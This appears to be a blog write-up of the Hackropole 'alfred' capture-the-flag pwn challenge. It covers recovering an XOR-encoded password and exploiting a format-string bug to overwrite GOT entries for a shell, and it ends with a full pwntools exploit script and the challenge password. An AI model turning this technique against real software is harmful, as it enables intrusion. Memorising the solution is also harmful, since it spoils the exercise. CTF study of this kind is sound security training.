+++
title = "Hackropole | Alfred"
+++

# [Pwn] alfred | hackropole

* [1. Checksec](#checksec)
* [2. Writeup](#writeup)
* [3. Full exploit](#full-exploit)

## Checksec

```bash
[*] '/home/botman/Documents/cybersec/CTF/solo/hackropole/pwn/alfred/alfred'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## Writeup

We begin with a lill bit of reversing to find the password

![reverse](/images/alfred/reverse.png)

We can see a call to `system` in the function `todo\scripts` which will may be useful later because our binary is staticelly compiled so we don't have to defeat the libc PIE with a leak.

![reverse](/images/alfred/reverse2.png)

We see that the input is simply XORed and then compared with a strange value which is our password encrypted so we just have to find the key and XOR it with the password so we can just break when the encryption happens to get the key

![xor key](/images/alfred/xor_key.png)

We get the key which is 0x35 and with [cyberchef](https://gchq.github.io/CyberChef/) we find the password which is `Alma_and_Pat` so we can continue the challenge and rapidly find a format string

![format string](/images/alfred/fmtstr.png)

So we will be able to rewrite the GOT of our binary to get a shell with the system function but a there is a lill problem, we cannot call any function with the value that we want so we have to loop on `todo_script` so let's have a closer look to this function

![reverse](/images/alfred/reverse3.png)

We see two interesting functions, printf to exec our shell and putc to loop so we're gonna replace the printf GOT value by the address of system and the putc GOT value by our `todo_script` addresse

![shell](/images/alfred/shell.png)

So we gain the shell but we still have to get the flag, so we're gonna use `base64` soft to get the pdf content and then `pdftotext` and tadaaa

![flag](/images/alfred/flag.png)

## Full exploit

```python
from pwn import *
import pdftotext
import base64

def exploit(io, elf, libc=None):
    io.sendlineafter(b'>>> ', b'Alma_and_Pat')

    offset = 7
    writes = {
            elf.got['putc']: elf.sym['todo_scripts'],
            elf.got['printf']: elf.sym['system']
    }

    payload = fmtstr_payload(offset, writes)
    io.sendlineafter(b'>>> ', payload)
    io.sendline(b'/bin/sh')
    io.recvuntil(b'sh: 1: Hello: not found')
    read_files('script_flag.pdf', io)

def read_files(file, io):
    io.sendline(f'base64 {file}'.encode('utf-8'))
    flag = io.recvuntil(b'==')
    flag = base64.b64decode(flag.replace(b'\n', b''))

    with open('flag.pdf', 'w+b') as f:
        f.write(flag)
    
    with open('flag.pdf', 'rb') as f:
        flag = pdftotext.PDF(f)
        io.success(f'flag: {("".join(flag)).replace(chr(0xa), "")}')
```

[download here](/exploits/alfred.py)

**Writed by *0xB0tm4n***
